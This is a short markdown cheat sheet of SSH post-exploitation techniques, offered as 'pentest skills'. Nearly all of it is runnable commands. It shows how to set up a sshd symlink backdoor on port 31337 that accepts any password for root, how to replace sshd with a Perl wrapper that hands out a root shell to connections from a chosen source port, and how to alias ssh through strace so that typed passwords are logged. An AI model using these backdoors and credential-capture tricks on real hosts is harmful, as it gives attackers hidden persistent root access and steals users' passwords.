# Some SSH Pentest skills

## Open a SSH port after getting a shell (Persistent)

```bash
[root@victim:~]# ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; 
```

They you can login ssh with port 31337 with username root or bin or ftp or mail and arbitrary password

For example:

```bash
ssh root@172.16.100.128 -p 31337
arbitrary password
```

## Make a SSH wrapper(without opening a new Port)

On Victim:

```bash
[root@localhost ~]# cd /usr/sbin
[root@localhost sbin]# mv sshd ../bin
[root@localhost sbin]# echo '#!/usr/bin/perl' >sshd
[root@localhost sbin]# echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
[root@localhost sbin]# echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
[root@localhost sbin]# chmod u+x sshd
[root@localhost sbin]# /etc/init.d/sshd restart
```

On Attacker:

```bash
socat STDIO TCP4:10.18.180.20:22,sourceport=13377
```

## Record ssh client password

```bash
[test@CentOS tmp]$ alias ssh='strace -o /tmp/sshpwd.log -e read,write,connect -s2048 ssh'
[test@CentOS tmp]$ grep "read(4" /tmp/sshpwd.log 
read(4, "y", 1) = 1
read(4, "e", 1) = 1
read(4, "s", 1) = 1
read(4, "\n", 1) = 1
read(4, "h", 1) = 1
read(4, "e", 1) = 1
read(4, "h", 1) = 1
read(4, "e", 1) = 1
read(4, "\n", 1) = 1
read(4, "e", 16384) = 1
read(4, "x", 16384) = 1
read(4, "i", 16384) = 1
read(4, "t", 16384) = 1
read(4, "\r", 16384) = 1
```
